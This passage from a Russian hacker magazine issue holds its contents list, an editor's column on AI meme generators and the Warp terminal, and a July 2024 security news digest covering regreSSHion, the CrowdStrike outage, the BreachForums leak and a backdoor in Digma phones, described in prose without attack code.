
            № 304
CONTENTS


    (Де)генеративные мемы грядут
  Колонка главреда

    MEGANews
  Самые важные события в мире инфосека за июль

    IP-камеры на пентестах
  Используем видеокамеры не по назначению

    Убойное видео
  Как я написал эксплоит для бага в Telegram и что было дальше

    Radare2 с самого начала
  Учимся использовать опенсорсный фреймворк для анализа приложений в Linux

    Принеси свой уязвимый драйвер
  Разбираем BYOVD — одну из опаснейших атак на Windows за последние годы

    Золотой ключик
  Разбираем на примере принцип создания кейгенов

     CobInt
  Разбираем известный бэкдор и практикуемся в реверсе

     Malleable C2
  Создаем профиль для скрытой передачи данных Cobalt Strike

    HTB Jab
  Применяем AS-REP Roasting при атаке на Windows

    HTB Perfection
  Обходим фильтр SSTI на примере WEBrick

    HTB Corporate
  Эксплуатируем Self-XSS, брутим PIN от Bitwarden и подделываем JWT

    HTB WifineticTwo
  Атакуем OpenPLC и взламываем точку доступа

    Недетский контроль
  Настраиваем Linux для ребенка

    Разгадайка
  Пишем собственный деобфускатор для JavaScript

    Асинхронная рансомварь
  Разбираем механизм самых быстрых криптолокеров

    Надзор за Sysmon
  Защищаем мониторинг от атак штатными средствами Windows

    ВАХ
  Измеряем вольт-амперную характеристику полупроводника при помощи Arduino

    ReForge
  Улучшаем картинки, генерируемые Stable Diffusion
HEADER





Срочно в номер: главному редактору жур‐
нала «Хакер» попались смешные мемасы!
Точнее, сами по себе они вполне обычные,
а вот их изнанка способна вызвать шок
будущего. И виноваты, конечно, снова ней‐       Андрей Письменный                                                                                      Главный редактор
ронки. Только все смирились с тем, что         apismenny@gmail.com
машина  пишет  школьникам  отменные
рефераты, как теперь ее научили еще и
шутить‑прикалываться.


Мемы, о которых идет речь, на первый взгляд действительно вполне орди‐
нарные. В центре — какой‑нибудь персонаж, а вокруг — короткие шуточки,
высмеивающие его слабые стороны. Например, вот этот собакен думает, что
он хороший мальчик, а самого много месяцев не купали; думает, что хорошо
надрессирован, а сам иногда писает на коврик, ну и так далее.





Штука в том, что этот мем почти целиком сделан искусственным интеллектом
на сайте Glif.app, при помощи готового рецепта Wojak Meme Generator. Ты
только называешь персонажа, ждешь минуту, и готово.
   Хочешь мем про редактора «Хакера»? Пишем «Xakep.ru editor», и...





И тут же внизу немного припекает, потому что эта электронная сволочь нас‐
мехается над нами: «Думают, что на переднем краю, а сами пописывают
про SQL-инъекции». Что, между прочим, чистейшая правда: недавно был
именно такой материал и я по этому поводу писал колонку, чтобы поддержать
авторов статей для новичков. Что ж, уел, зараза!
   Впрочем, мы отвлеклись (тем более, что самый жесткий прикол тут другой,
но не будем об этом). Вместо этого нажмем кнопочку Remix и глянем, что
у заразы внутри.





Видим нехитрую программку из блоков в духе Scratch или эппловского
Shortcuts. Она получает ввод от пользователя и передает его в блок, генери‐
рующий текст.
  В нем задан следующий запрос, где вместо {input1} подставляется вве‐
денное тобой слово:


     Now do JSON for the input: {input1}
      We've been asked to make this one extra spicey. When the input contains«
      more than just a concept / profession / person, use that context, but don't
       bloat the headline with  it. Make sure to have the image idea include
      something specific about the roasted profession or concept. Start with {
        just go:                »
Дополнительные инструкции:


      You  are  simulating  a  most  unhinged  Wojak meme  creator  that
         is specialized in the format of depicting a character with a surrounding tag«
       cloud of text in the style of "sh*t xyz says". You output JSON like so, here
         is an example of the input "economist":                »
Дальше — пример вывода в формате JSON:


{
  "headline": "THE ECONOMIST",
  "text1": ""recession in 2 weeks" -- been in recession for 15 years"
,
  "text2": ""housing market crash in 2 weeks" -- applies efficient
market hypothesis",
  "text3": ""GDP is real" -- Markets haven't been real in 15 years",
  "text4": ""China collapsing in two weeks"",
  "text5": ""33,000,000 jobs added this quarter"",
  "text6": ""A.I. replacing humanity in two weeks"",
  "text7": "cryptocurrency going to 0 in two weeks",
  "text8": "Inflation up 6.66%",
  "image": "smug economist grinning"
}

И еще немного инструкций:

       Rules: go deep, be specific. Find hilarious tragedy. Do not be racist. For
       obviously racist requests, generate one that mocks the requester instead.«
      You get the point! Add "--" between the two statements / duplets.                »
То есть, по сути, ИИ объясняют, как устроен формат мема, а затем дают при‐
мер, причем сразу в формате JSON (в нем же требуется и вывод). Все
это скармливается нейронке Claude 3.5 Sonnet. При желании можно выбрать
вместо этого Llama 3, GPT 3.5 или 4, Gemini, Perplexity, Mistral и другие вари‐
анты.
   Дальше идет парсинг данных — каждая строка из JSON сохраняется
в отдельной переменной.





И запрос к нейросети, рисующей изображения:


ugly portrait of {json1.image}, neutral empty white background

Ну а в конце все вместе собирается в одну картинку при помощи блока
Canvas. Здесь в текстовые поля подставляются значения переменных, а в
центре расположен сгенерированный ранее портрет.





И это все, что нужно, чтобы подарить людям массу радости и веселья! На том
же Glif.app есть рецепты и для других популярных форматов: сильная и слабая
собаки, Virgin vs Chad, айсберг и так далее. Можно генерировать не только
мемы: к примеру, кто‑то сделал рецепт, который штампует подделки под дет‐
ские рисунки.





                        Полный набор блоков Glif

В общем, сразу вспоминается широко растиражированная цитата сатирика
Карла Шарро: «Люди работают за минимальный оклад, пока роботы пишут
стихи и рисуют, — это не то будущее, которое я хотел». Что ж, теперь не толь‐
ко стихи, но и топовый контент для соцсетей.
   Ну а для тех, кто хочет чего‑нибудь посерьезнее, я припас другую находку,
тоже связанную с ИИ. Как ты, возможно, знаешь, одно из моих увлечений —
разные навороты для терминала. О последнем развитии событий я пару лет
назад писал в колонке «Терминальное счастье». А еще я давно поглядывал
на программу под названием Warp (есть версии для Mac, Windows и Linux).
   У Warp множество достоинств: он удобно разделяет вывод команд, поз‐
воляет кликать по названиям папок и файлов, чтобы открывать их, имеет
встроенный блокнот и прочие удобства. И конечно, в него недавно завезли
искусственный интеллект на основе ChatGPT. И в отличие от других программ,
куда его суют по поводу и без, здесь ИИ пришелся как нельзя более кстати.
   Вот, например, я прошу найти в папке ~/Downloads все файлы с подстро‐
кой Elden Ring в названии, а затем сделать из них страницу с тамбнейлами.





В ответ нейронка говорит: «Отлично, понадобится две команды — первой
соберем названия файлов, второй запустим  утилиту montage из пакета
ImageMagick». Обе команды можно сразу же и запустить. Результат — ровно
то, что я ожидал.





С одной стороны, как и в случае с мемами, вроде бы ничего революционного:
эти запросы и так можно было скормить ChatGPT вручную. С другой — прямо
у нас на глазах кардинально меняется подход к использованию компьютера.
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru


В этом месяце: YouTube в России замедляется, обновление
CrowdStrike сломало 8,5 миллиона Windows-систем, процес‐
соры  Intel могут необратимо  деградировать, уязвимость
regreSSHion  угрожает  серверам OpenSSH,  в  кнопочных
телефонах  Digma  нашли  бэкдор,  в  сеть  утекла БД
BreachForums и другие интересные события ушедшего июля.





ЗАМЕДЛЕНИЕ
YOUTUBE
В России начала замедляться работа YouTube. Глава комитета Госдумы
по информполитике Александр Хинштейн пояснил, что замедление сервиса
связано «в первую очередь с действиями (а точнее бездействием) самого
YT». А в Роскомнадзоре прокомментировали, что «неуважение к нашей стра‐
не и гражданам являются основанием для принятия мер в отношении
YouTube».


ХРОНОЛОГИЯ СОБЫТИЙ
Весной 2022 года компания Google уведомила российских провайдеров об отключении сер‐
веров Google Global Cache (GGC), которые позволяют ускорить загрузку сервисов компании,
включая YouTube.
    Так, в начале 2022 года в сетях российских операторов действовало около 700 кеширу‐
ющих серверов GGC, и ожидалось, что к концу 2023 года их количество сократится примерно
до 450.
  В конце 2023 года руководитель по стратегическому развитию передачи данных ПАО
«ВымпелКом» (торговая марка «Билайн») Константин Колесов сообщил на «Пиринговом форуме
MSK-IX», что Google предложила российским операторам организовать прямой стык в Москве
или Петербурге для сохранения качественного доступа к ее сервисам вместо выходящих
из строя и переполняющихся без модернизации кеш‑серверов.
   12 июля 2024 года представители «Ростелекома» предупредили «о вероятности воз‐
никновения в ближайшее время технических проблем со скоростью загрузки видео YouTube».
    Тогда в компании сообщили, что из‑за проблем в работе оборудования Google Global
Cache, используемого на сетевой инфраструктуре оператора и пиринговых стыках, возникают
технические проблемы, которые могут влиять на скорость загрузки и качество воспроизве‐
дения роликов в YouTube у абонентов всех российских операторов.
   В этот же день заявление «Ростелекома» прокомментировал пресс‑секретарь президента
России Дмитрий Песков, сообщив, что российские власти не планируют ограничивать доступ
к YouTube, а сложности в работе сервиса связаны с проблемами с оборудованием.
    Издание «Газета.ру», со ссылкой на собственные источники (близкие к администрации пре‐
зидента и занимающиеся сбором информации для силовых структур), сообщило, что россий‐
ские власти планируют окончательно заблокировать YouTube в сентябре 2024 года.
   24 июля 2024 года в «Ростелекоме» заявили, что фиксируют ухудшение качества заг‐
рузки видео на YouTube, особенно в форматах высокого разрешения, а также отмечают рост
жалоб пользователей на качество работы сервиса.
   В компании снова сообщили, что ответственность за это «несет корпорация Google (вла‐
делец видеохостинга YouTube), которая с 2022 года не занимается расширением и обновле‐
нием своего оборудования в России, обеспечивающего работу системы Google Global Cache»,
и проблемы с YouTube возникают из‑за «износа и исчерпания мощности оборудования Google»,
которое уже не может справляться с существенно выросшим интернет‑трафиком».
   25 июля 2024 года глава комитета Госдумы по информполитике Александр Хинштейн со‐
общил в своем Telegram-канале, что «„деградация“ YouTube — вынужденный шаг, направленный
не против российских пользователей, а против администрации иностранного ресурса, который
по‑прежнему считает, что может безнаказанно нарушать и игнорировать наше законодатель‐
ство».
   По его словам, скорость загрузки YouTube на десктопах к концу месяца может снизиться
на 70%.


Позже Александр Хинштейн опубликовал в своем Telegram-канале еще один
пост, в котором дал более подробные пояснения. Он подтвердил, что ско‐
рость загрузки YouTube за последнее время «по факту уже снизилась до 40%,
скоро может снизиться до 70%». По его словам, это в первую очередь свя‐
зано «с действиями (а точнее бездействием)» самого сервиса и отключением
серверов GGC.

      «С   учетом  остроты   ситуации,  Google  сам  начал  предлагать
      телеком‑операторам подключаться к российским дата‑центрам нап-«
      рямую. Это позволило остановить падение качества трафика, но вре-
       менно.
         Потому что тут же встала другая проблема: поскольку Google под-
      держивает санкции и даже обанкротил свою российскую „дочку“, он
      не может официально оплачивать услуги российских дата‑центров. Я
      не знаю детали: бесплатно ли размещены их сервера в наших ЦОДах,
      или деньги идут через „серые“ полукриминальные схемы. Но в любом
       случае это всё незаконно, и все участники это хорошо понимают.
        На это можно было бы, наверное, закрывать глаза, но только не в
       условиях,  когда YouTube  демонстративно  нарушает наши  законы
      и проводит откровенно антироссийскую политику: последовательно
       удаляет каналы россиян, игнорирует требования Роскомнадзора», —
      пишет Хинштейн.                »
По его словам, в ближайшее время российские даты‑центры, сотрудни‐
чающие с Google, намерены прекратить работу с компанией по «серым схе‐
мам», что приведет к еще более резкому падению скорости загрузки YouTube.


       «Администрации ЦОДов разумно рассудили, что делать это лучше
       всего в августе, чтобы минимизировать последствия для наших граж-«
       дан. Действия ЦОД затронут в первую очередь трафик стационарных
       компьютеров.
         Важно понимать, что для российских пользователей ресурс все
       равно   останется  доступным.  Те,  кто  смотрит  художественный
      или учебно‑просветительский контент, и дальше смогут это делать,
       просто на его загрузку теперь потребуется чуть больше времени.
         Скорее всего, наиболее чувствительно отреагируют на снижение
       качества трафика рекламодатели, и вот это станет для Google уже
       серьезной проблемой.
         Можно ли изменить ситуацию? Да. Но все зависит исключительно
      от политики самого Google.
         Повторял и повторяю: дальнейшая судьба YouTube в России —
      в его руках.
         Google ничто не мешает: построить собственные серверные центры
      в  РФ,  открыть  представительство  (вместо  банкротства  „дочки“)
      и вообще перестать относиться к нашей стране как к информацион-
      ной колонии (слава Богу, YT уже больше не монополист и у нас раз-
       виваются свои ресурсы);  договориться с властями США о  снятии
       антироссийских санкций на поставку в РФ своего оборудования либо
       производить легальные платежи по оплате услуг наших ЦОДов.
       И наконец — главное: научиться соблюдать наши законы и прек-
      ратить свою антироссийскую политику, что в условиях СВО является
       принципиальным.
       Уж как минимум Google должен сейчас выполнить требования Рос-
      комнадзора и разблокировать (заметьте: не заблокировать, а именно
        разблокировать!) каналы российских СМИ, блогеров, общественных
       деятелей.
       До тех пор пока неоднократные предписания регулятора остаются
       неисполненными, у государства есть все основания для применения
     мер принуждения, предусмотренных законом», — заявил Хинштейн.                »
Прокомментировали ситуацию с замедлением YouTube и в Роскомнадзоре
(РКН). В пресс‑службе ведомства сообщили СМИ, что причиной принятия
мер к YouTube стало «неуважение к стране».


       «Многочисленные нарушения нашего законодательства, неуважение
       к нашей стране и гражданам являются основанием для принятия мер«
      в отношении YouTube», — говорится в сообщении РКН.                »
В ведомстве добавляют, что у Роскомнадзора достаточно инструментов
для мотивации компании в такой ситуации. Так, в ведомстве напомнили, что
суд РФ взыскал за последние три года с компании Google свыше 25 миллиар‐
дов рублей, хотя «и эта мера не помогла».
   Также в РКН отметили, что неоднократно обращались к Google с требова‐
нием о разблокировке более 200 аккаунтов российских СМИ, артистов
и общественных деятелей, однако не получали ответа.
  В последние несколько дней сразу несколько провайдеров (например,
МТС и «Дом.ру») начали предупреждать своих абонентов о возможных сбоях
в работе YouTube.

      «По независящим от МТС причинам у некоторых абонентов могут наб-
       людаться сбои в работе YouTube», — сообщает робот МТС при звонке«
      на горячую линию.                »

230 000 000 ДОЛЛАРОВ США УКРАЛИ У WAZIRX

Индийская криптобиржа WazirX стала жертвой взлома, который привел к краже криптовалютных
активов на сумму 230 миллионов долларов США.

По информации аналитиков компании  Elliptic, у WazirX были похищены: 5,43 миллиарда
токенов SHIB, более 15 200 токенов Ethereum, 20,5 миллиона токенов Matic, 640 миллиар-
дов токенов Pepe, 5,79 миллиона USDT, 135 миллионов токенов Gala и так далее.





Злоумышленники  попытались  конвертировать  эти  активы на  децентрализованной  бирже
Uniswap. В Elliptic отметили, что стоящие за атакой хакеры могут быть связаны с Северной
Кореей.





УЯЗВИМОСТЬ
REGRESSHION
Миллионы серверов OpenSSH могут быть уязвимы перед свежей проблемой
regreSSHion (CVE-2024-6387), которая может использоваться для неаутен‐
тифицированного удаленного выполнения кода.
   Уязвимость CVE-2024-6387 была найдена специалистами ИБ‑компании
Qualys, которые рассказали, что это критический баг, серьезность которого
ничуть не уступает таким нашумевшим проблемам, как Log4Shell.
   Проблема связана с серверным процессом sshd, который подвержен сос‐
тоянию гонки обработчика сигналов. Это позволяет неаутентифицирован‐
ному удаленному злоумышленнику выполнить код с привилегиями root в Linux-
системах на базе glibc. Пока неизвестно, возможна ли эксплуатация CVE-
2024-6387 в системах под управлением Windows и macOS.
  По сути, CVE-2024-6387 представляет собой вариант старой уязвимости
CVE-2006-5051, и  уязвимость вновь  проявилась  в октябре 2020 года
с выходом OpenSSH 8.5p1. То есть перед regreSSHion уязвимы:
 • версии OpenSSH до 4.4p1, если в них не установлены исправления
   для CVE-2006-5051 и CVE-2008-4109;
 • версии с 8.5p1 по 9.8p1 (не включительно), где проблема вновь прояви‐
   лась из‑за случайного удаления критического компонента.

Версии с 4.4p1 до 8.5p1 (не включительно) не уязвимы благодаря патчу
для CVE-2006-5051, который сделал небезопасную ранее функцию безопас‐
ной.  Также  отмечается,  что  ошибка  не  затрагивает  OpenBSD,  так
как в 2001 году OpenBSD разработали защищенный механизм, предотвра‐
щающий эту проблему.


      «Если клиент не проходит аутентификацию в течение LoginGraceTime
      секунд (120 по умолчанию), то обработчик SIGALRM в sshd вызывается«
       асинхронно и вызывает различные функции, которые не являются
      безопасными с точки зрения async-signal, — поясняют в бюллетене
      безопасности  разработчики  Debian. —  Удаленный  неаутентифици-
      рованный злоумышленник может воспользоваться этим и выполнить
       произвольный код с привилегиями root».                »
Дело осложняется тем, что OpenSSH широко применяется на предприятиях
для удаленного управления серверами и безопасного обмена данными. Так,
по информации компании Qualys, поиск через Shodan и Censys обнаруживает
более 14 миллионов потенциально уязвимых экземпляров OpenSSH, дос‐
тупных через интернет.
   Несмотря на серьезность проблемы, специалисты Qualys пишут, что
regreSSHion трудно эксплуатировать в реальности и потребуется множество
попыток, чтобы добиться необходимого повреждения памяти. Однако отме‐
чается,  что для  преодоления  этих  трудностей и повышения  процента
успешной эксплуатации могут быть использованы ИИ‑инструменты.
   Проблема  regreSSHion  была  устранена  с  выходом  версии  9.8p1,
до которой теперь рекомендуется обновиться как можно скорее.
   Также отметим, что во время анализа CVE-2024-6387 в OpenSSH была
найдена еще одна уязвимость удаленного выполнения кода.
   Второй баг обнаружил специалист Openwall Александр Песляк. Он расска‐
зал, что эта проблема, связанная с regreSSHion, представляет собой сос‐
тояние  гонки при  обработке сигналов с участием дочернего  процесса
privsep.
   Уязвимость получила идентификатор CVE-2024-6409 (7 баллов по шкале
CVSS) и затрагивает sshd-демон версий 8.7p1 и 8.8p1, которые используются
в Fedora 36 и 37, а также в Red Hat Enterprise Linux 9 (RHEL 9).


НОВЫЙ DDOS-РЕКОРД

В начале 2024 года компания OVHcloud отразила рекордную DDoS-атаку, мощность которой
достигла 840 миллионов пакетов в секунду (Mpps). В компании считают, что за этой ата‐
кой стоял ботнет из устройств MikroTik.


С начала 2023 года наблюдается тенденция к увеличению объема атак, причем атаки, пре‐
вышающие 1 Тбит/с, в 2024 году уже стали еженедельными и практически ежедневными.

За последние 18 месяцев наиболее мощная атака, зафиксированная OVHcloud, произош‐
ла 25 мая 2024 года и достигла 2,5 Тбит/с.





А в апреле текущего года сама OVHcloud столкнулась с атакой мощностью 840 Mpps, что пре‐
восходит предыдущий рекорд — DDoS-атаку мощностью 809 Mpps, направленную на европей‐
ский банк, которую специалисты Akamai отразили в июне 2020 года.

Атака типа TCP ACK исходила с 5000 IP-адресов. Две трети пакетов были направлены всего
через четыре точки в США.





Многие из зафиксированных инцидентов, включая рекордную атаку, исходили от скомпромети‐
рованных устройств MikroTik Cloud Core Router, предназначенных для высокопроиз‐
водительных сетей.

Исследователи компании обнаружили в интернете более 100 тысяч доступных устройств
MikroTik.

Объединение даже 1% доступных девайсов в ботнет может дать злоумышленникам достаточно
мощности для проведения атак, достигающих 2,28 миллиарда пакетов в секунду.





БЭКДОР В
«БАБУШКАФОНАХ»
Специалист обнаружил бэкдор в телефонах Digma (принадлежит российской
дистрибуторской компании «Мерлион»). Он позволяет управлять телефоном
удаленно, в том числе рассылать SMS-сообщения и принимать их, переда‐
вать данные на сторонние серверы, регистрировать на номер телефона жер‐
твы аккаунты в мессенджерах и так далее.
   Ссылаясь на неназванный «источник в отрасли кибербезопасности»,
который столкнулся с проблемой, «Коммерсант» сообщил, что через месяц
после покупки кнопочного телефона Digma и подключения новой SIM-карты
на этот номер без ведома  пользователя был зарегистрирован  аккаунт
в WhatsApp.
  По словам неназванного специалиста, телефон с определенной пери‐
одичностью обращается к удаленному серверу, передавая такие данные,
как IMEI-идентификатор, идентификатор SIM-карты и информацию об опе‐
раторе связи. Сервер в ответ посылает устройству команду: отправить SMS
с заданным текстом на конкретный номер, вывести полученное сообщение
на экран. При этом отправленные и принятые сообщения не сохраняются
в памяти телефона.
  На обращения пользователя специалисты Digma ответили, что отмечают
«аномалии» в работе прошивки устройства, однако наличие уязвимости
не подтвердили.
   Стоит отметить, что еще в 2021 году ИБ‑специалист, известный под ником
ValdikSS, посвятил проблеме троянов и бэкдоров в простейших кнопочных
телефонах большую статью. Тогда он рассказывал, что в российской рознице
встречаются устройства «со встроенным трояном, отправляющим платные
СМС‑сообщения на короткие номера, текст которого загружается с сервера,
также бывают устройства с настоящим бэкдором, пересылающим входящие
СМС‑сообщения на сервер злоумышленников».
   После выхода публикации в «Коммерсанте» ValdikSS сообщил, что речь
шла о модели Digma A172, которую он изучает уже несколько месяцев.


       «Бэкдор хороший:  когда с сервера приходит команда на отправку
    СМС (или когда получена входящая СМС при установленном фильтре),«
       визуально нет никакой индикации о каком‑либо событии, предус-
       мотрели даже скрытие иконки выхода в интернет (G у силы сети).
         Данные  шифруются RC5 с  динамическим  ключом, для  обмена
       используется BSON.
        На первых  этапах функции СМС используются для  того, чтобы
      узнать номер  владельца:  одному  телефону, номер  которого уже
      известен, сервер устанавливает фильтр входящих сообщений, а вто-
      рому дает команду на  отправку СМС на номер  первого. Первый
      телефон пересылает номер и текст полученного СМС на  сервер.
     В тексте содержится уникальный идентификатор, позволяющий свя-
       зать  номер  телефона  с  другими  известными  идентификаторами
       телефона.
          Впоследствии вредонос может  использоваться для  регистрации
       аккаунтов в мессенджерах и на сервисах, требующих подтверждения
      по СМС, но происходит это не сразу — активность телефона отсле-
       живается по времени с момента его включения, количеству принятых
    СМС и другим параметрам, чтобы затруднить обнаружение бэкдора.
       Я  позвонил по  одному из номеров, который  сервер сообщил
      для отправки СМС, — женщина на том конце подтвердила, что получи-
      ла от меня СМС „с какими‑то цифрами“, и уточнила, что ранее SIM
       стояла в кнопочном телефоне, а сейчас установлена в смартфон.
        Digma только что, после статьи в „Коммерсанте“, закрыла тикет
      с формулировкой „Так, закрыли обсуждение“. До этого они утвержда-
       ли, что интернет используется для обновления доступности и цен сер-
      виса подписок Funbox, несмотря на то что в более свежей прошивке,
      на телефон с которой зарегистрировали WhatsApp, его нет», — писал
       исследователь.                »
После выхода публикаций в СМИ представители Digma дали следующий ком‐
ментарий:

      «В кнопочных телефонах Digma отсутствует функционал, который мож-
      но классифицировать как backdoor или встроенную уязвимость. В про-«
       шивку встроен функционал от стороннего российского сервиса, целью
       которого является обмен SMS-сообщениями фиксированного формата
      для персонализации доступных развлекательных и информационных
       сервисов в конкретном регионе — гороскопы, погода, анекдоты и т. д.
     Обмен сообщениями такого типа  является полностью  бесплатным
      для  пользователей.  Подключение  платных  услуг  ведется  только
      с явного согласия пользователя. Любой иной функционал, включая
       якобы скрытую регистрацию пользователей в мессенджерах, в устрой-
      ствах Digma отсутствует. Наши маркетинговые исследования показы-
      вают,  что  вышеуказанный  развлекательный  функционал  является
      наиболее востребованным среди пользователей кнопочных телефо-
       нов, таким образом, основным нашим намерением встраивания дан-
      ного функционала в прошивку является улучшение клиентского опыта.
       Изъятие телефонов из продажи мы не планируем, так как не видим
       оснований для  этого. Мы запланируем  внеочередное независимое
       тестирование наших устройств на предмет поиска уязвимостей в про-
       шивке кнопочных телефонов у крупных независимых компаний и опуб-
       ликуем результаты», — заявили в компании.                »





БИЛЛ ГЕЙТС О КЛИМАТЕ И ИИ
На конференции, организованной венчурным фондом Breakthrough Energy, Билл Гейтс сообщил
журналистам, что, по его мнению, искусственный интеллект скорее поможет человечеству
решить климатические вопросы, чем помешает.
    Гейтс считает, что ИИ позволит странам потреблять меньше энергии, а также сократит выб‐
росы углекислого газа, даже если людям потребуется больше дата‑центров.

           «Давайте не будем перегибать палку. В самом крайнем случае дата‑центры→        увеличивают спрос на электроэнергию на 6% (но скорее на 2–2,5%). Вопрос
       в том, поможет ли ИИ добиться сокращения этих 6%? Ответ — безусловно», —
       заявил Гейтс и добавил, что дополнительное энергопотребление, создаваемое
        дата‑центрами для ИИ, скорее всего, будет сопровождаться новыми инвести‐
      циями в «зеленую» энергетику, поскольку технологические компании готовы
       доплачивать за использование чистых источников электроэнергии.





УТЕКЛА БД
BREACHFORUMS
В сети опубликовали полную базу данных первой версии хакерского форума
BreachForums. Дамп содержит информацию о пользователях, их личные
сообщения,  криптовалютные  адреса  и  все  сообщения,  оставленные
на форуме.
   Предполагается, что эти данные получены из бэкапа БД, который создал
и продал еще в 2023 году бывший админ ресурса, Конор Брайан Фитцпатрик
(Conor Brian FitzPatrick), также известный под ником Pompompurin.
   Напомним, что весной 2023 года правоохранители закрыли BreachForums
в первый раз и вскоре 20-летний администратор и создатель ресурса,
Pompompurin, был арестован. В итоге он признал себя виновным по несколь‐
ким пунктам обвинения, а в январе 2024 года его приговорили к 20 годам
под надзором.
  Под названием BreachForums уже работало несколько сайтов, но все они
были посвящены покупке, продаже и сливу данных, украденных у взломанных
компаний.
   Так, после ареста Фитцпатрика в прошлом году BreachForums закрылся,
однако быстро появились несколько новых версий сайта, которые в итоге
тоже были захвачены правоохранительными органами. Последняя вариация
BreachForums запущена ShinyHunters (но теперь перешла к новым админис‐
траторам) и работает по сей день.
   Считается, что Фитцпатрик создал и продал БД, теперь попавшую в откры‐
тый доступ, еще в июле прошлого года, когда его выпустили под залог. С тех
пор данные циркулировали среди хакеров, а один из них даже пытался про‐
дать дамп за 150 тысяч долларов.
   Теперь же хакер под ником emo сначала опубликовал в сети порцию дан‐
ных о 212 414 пользователях BreachForums, включая их имена, адреса элек‐
тронной почты и IP-адреса, после того как его самого забанили на текущей
версии сайта.
  По словам emo, данные были получены непосредственно от Фитцпатрика,
который якобы пытался продать их в июне 2023 года за 4000 долларов,
находясь под залогом. Хакер утверждал, что в итоге дамп приобрели три зло‐
умышленника.
   Так как эта публикация не помогла остановить конфликт между членами
сообщества BreachForums, 23 июля 2024 года emo слил в Telegram полную
БД, обнародовав огромное количество дополнительной информации.





       «Полная  база  данных  BreachForum  v1,  содержащая  все  записи
      до 29 ноября 2022 года, — писал emo в Telegram. — Эта БД включает«
       всё: личные сообщения, темы, логи платежей, подробные логи IP-
       адресов для каждого пользователя и так далее. Изначально я выложил
       только  таблицу  пользователей,  чтобы  предотвратить  ее  продажу
      за кулисы сотрудниками BreachForum, но теперь стало очевидно, что
      эта БД есть у  стольких людей, что ее  утечка просто неизбежна.
      Это дает всем шанс просмотреть свои записи и устранить пробелы
      в OPSEC».                »
Судя по временным отметкам, это полная резервная копия форума MyBB,
созданная 28 ноября 2022 года. БД содержит все данные форума, включая ID
пользователей, хешированные пароли, личные сообщения, криптовалютные
адреса, использовавшиеся для покупки форумных кредитов, и все сооб‐
щения на сайте.
   Особый интерес, конечно, представляют личные сообщения, в которых
хакеры рассказывают друг другу о своих эксплоитах, выражают желание
купить доступ к сетям организаций или ищут доступ к свежим украденным
данным.
    Хотя правоохранительные органы уже располагают этой БД, которую они
получили  после  захвата  первой  версии  сайта и  ареста  Фитцпатрика
в 2023 году, другие преступники, журналисты и ИБ‑исследователи раньше
не имели доступа к этому дампу.


265 ЧЕЛОВЕК В РФ ВЛАДЕЮТ 1,1 МИЛЛИОНА
ТЕЛЕФОННЫХ НОМЕРОВ
В Роскомнадзоре сообщили, что за период с 1 ноября 2023 года было выявлено 3,7 мил-
лиона SIM-карт, оформленных с нарушениями. Карты в итоге были заблокированы, либо
договоры по ним были расторгнуты.


Также ведомство проанализировало переданные операторами сведения об абонентах и выяви‐
ло, что на сегодняшний день 265 человек имеют более чем 1000 SIM-карт каждый. В общей
сложности они владеют свыше 1,1 миллиона мобильных номеров.

По мнению специалистов, в этой ситуации «усматриваются нарушения установленного процес‐
са оформления карты или потенциально мошеннические действия со стороны  абонента,
дилера или оператора связи».





                                     Продолжение статьи →
← Начало статьи





 НЕУДАЧНОЕ
 ОБНОВЛЕНИЕ
 CROWDSTRIKE
  В середине июля обновление enterprise-решения CrowdStrike Falcon Sensor
   привело к тому, что миллионы Windows-систем показали «синий экран смер‐
   ти» (BSOD).
      Пострадавшие   хосты  уходили  в  бесконечный  цикл  перезагрузки
  или демонстрировали BSOD, а из строя выходили целые компании с парками,
   насчитывающими сотни тысяч машин.
     Это повлекло за собой массовые сбои в работе аэропортов, банков,
   медицинских учреждений и множества других организаций в США, Великоб‐
   ритании, многих странах ЕС, Индии, Новой Зеландии, Австралии. По данным
   Microsoft, от сбоев пострадали около 8,5 миллиона Windows-систем.
      Позже специалисты CrowdStrike и Microsoft опубликовали детальные тех‐
   нические отчеты об инциденте.
     Компании сообщили, что причиной глобального сбоя стал баг в тестовой
   системе Content Validator. Так, выяснилось, что после прохождения Content
   Validator обновление не подвергалось дополнительным проверкам из‑за
  доверия   к   предыдущим  успешным   развертываниям   Inter-Process
  Communication (IPC) Template Type. Поэтому проблемное обновление оста‐
  валось незамеченным вплоть до развертывания на хостах клиентов, работа‐
  ющих с Falcon версии 7.11 и более поздних.
    В CrowdStrike пообещали улучшить процессы тестирования (добавив фаз‐
   зинг, стресс‑тесты, проверки стабильности и так далее), а также исполь‐
   зовать поэтапные развертывания обновлений для меньших пулов клиентов.
   Также впредь компания намерена публиковать release notes для обновлений
   EDR-контента, чего раньше не делала.
     Компания принесла публичные извинения от имени своего генерального
   директора Джорджа Курца (George Kurtz) и директора по безопасности Шона
   Генри (Shawn Henry).


        «Все в CrowdStrike понимают серьезность и последствия сложившейся
          ситуации, — уверял Курц. — Для меня нет ничего важнее доверия, «
         которое наши клиенты и партнеры оказали CrowdStrike. По мере того
          как мы будем разбираться с этим инцидентом, я обязуюсь обеспечить
         полную прозрачность в отношении того, как это произошло, и мер,
        которые мы принимаем для предотвращения повторения подобного».
           «Я занимаюсь профессиональной деятельностью уже почти 40 лет,
        и моей путеводной звездой  всегда была „защита хороших людей
         от плохих“, — писал Генри. — Эти два дня стали для меня самыми
         сложными 48 часами за последние 12+ лет. Доверие, которое мы
           выстраивали по крупицам на протяжении многих лет, было утрачено
         в считаные часы, и это был тяжелый удар».                 »
  В конце месяца Джордж Курц сообщил, что уже 97% Windows-систем, пос‐
   традавших от проблемного обновления, восстановлены и работают в штат‐
  ном режиме.
     Что касается отчетов Microsoft, вице‑президент Microsoft Джон Кейбл
   (John Cable) заявил, что для ликвидации последствий этого инцидента ком‐
  пания «задействовала более 5000 инженеров поддержки, которые работали
   круглосуточно». Также он намекнул на возможные изменения в Windows
   в будущем, которые помогут избежать повторения таких массовых сбоев.
    В частности, Кейбл отметил, что анклавы VBS и Azure Attestation также
   могут обеспечить безопасность Windows, не требуя доступа на уровне ядра,
  который сейчас есть у большинства защитных продуктов для Windows (вклю‐
   чая CrowdStrike Falcon Sensor). Он не стал уточнять, какие именно изменения
   могут появиться в Windows, лишь сообщил, что Microsoft продолжит укреплять
  свою платформу и «делать еще больше для повышения устойчивости экосис‐
  темы Windows, открыто сотрудничая с широким сообществом специалистов
  по безопасности».
      Стоит сказать, что аналитики страховой компании Parametrix подсчитали,
   что только американские компании из списка Fortune 500 (среди которых
   пострадала примерно четверть) понесли убытки в размере 5,4 миллиарда
